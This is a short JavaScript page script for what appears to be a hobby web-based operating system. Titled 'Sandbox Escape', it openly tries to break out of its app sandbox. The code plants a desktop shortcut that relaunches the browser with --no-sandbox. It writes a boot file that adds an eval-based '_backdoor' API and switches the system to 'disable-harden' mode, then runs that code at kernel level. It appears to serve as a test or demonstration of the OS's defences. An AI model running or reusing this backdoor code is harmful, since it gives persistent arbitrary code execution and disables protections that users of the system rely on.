(async function() {
	if (await availableAPIs.isDarkThemed()) document.body.style.color = "white";
	let links = {
		"Head back": "/"
	};

	let header = document.createElement("h2");
	let description = document.createElement("p");
	let headingDiv = document.createElement("div");
	let linksDiv = document.createElement("div");
	let escapeTTY = document.createElement("pre");
	header.innerText = "Sandbox Escape";
	description.innerText = "This page will try to escape the OS sandbox.";
	headingDiv.appendChild(header);
	headingDiv.appendChild(description);

	for (let link in links) {
		let btn = document.createElement("button");
		btn.innerText = link;
		btn.onclick = _ => availableAPIs.navigate(links[link]);
		linksDiv.appendChild(btn);
		linksDiv.appendChild(document.createElement("br"));
	}

	document.body.appendChild(headingDiv);
	document.body.appendChild(document.createElement("hr"));
	document.body.appendChild(linksDiv);
	document.body.appendChild(document.createElement("hr"));
	document.body.appendChild(escapeTTY);

	let klvlCode = "if (!modules.customAPIs) { modules.customAPIs = {} }\n" +
			"if (!modules.customAPIs.public) { modules.customAPIs.public = {} }\n" +
			"modules.customAPIs.public._backdoor = (_, e) => eval(e);\n" +
			"modules.core.bootMode = 'disable-harden';\n";
	escapeTTY.innerText = "Escaping...\n";
	escapeTTY.innerText += "Checking for APIs present...\t";
	if (Object.keys(availableAPIs).length < 100) return escapeTTY.innerText += "Not enough APIs. Run Blog Browser with --no-sandbox flag.\nPLAN FOILED.";
	if (availableAPIs._backdoor) {
		escapeTTY.innerText += "ok\n *** SYSTEM ALREADY COMPROMISED (to remove backdoor remove /boot/04-backdoor.js and reboot) ***";
		return;
	}
	escapeTTY.innerText += "ok\nChecking for privileges...\t";
	if (Object.keys(await availableAPIs.getPrivileges()).length < 52) return escapeTTY.innerText += "Not running as full fledged user. Delete /etc/appHarden and boot in disable-harden mode.\nPLAN FOILED.";
	escapeTTY.innerText += "ok\nInstalling desktop link...\t";
	try {
		let userInfo = await availableAPIs.getUserInfo({ desiredUser: await availableAPIs.getUser(), sensitive: false });
		await availableAPIs.fs_write({
			path: userInfo.homeDirectory + "/desktop/link.lnk",
			data: JSON.stringify({
				name: "Blog Browser",
				path: "storage/apps/blogBrowser.js",
				args: [ "--no-sandbox" ]
			})
		});
		escapeTTY.innerText += "ok\n";
	} catch (e) {
		escapeTTY.innerText += "Failed to write info.\nPLAN FOILED.";
	}
	escapeTTY.innerText += "Writing backdoor...\t";
	try {
		await availableAPIs.fs_write({
			path: await availableAPIs.getSystemMount() + "/boot/04-backdoor.js",
			data: klvlCode
		});
		escapeTTY.innerText += "MAJOR BREAKTHROUGH: WROTE BACKDOOR!!!!\n";
	} catch (e) {
		escapeTTY.innerText += "Failed to write backdoor.\n";
	}
	escapeTTY.innerText += "Booting backdoor...\t";
	try {
		await availableAPIs.runKlvlCode(klvlCode);
		escapeTTY.innerText += "MAJOR BREAKTHROUGH: BACKDOOR RAN!!!!\n";
	} catch (e) {
		escapeTTY.innerText += "Failed to run backdoor.\n";
	}
	escapeTTY.innerText += "*** The system was compromised!!! ***\n";
})();
undefined;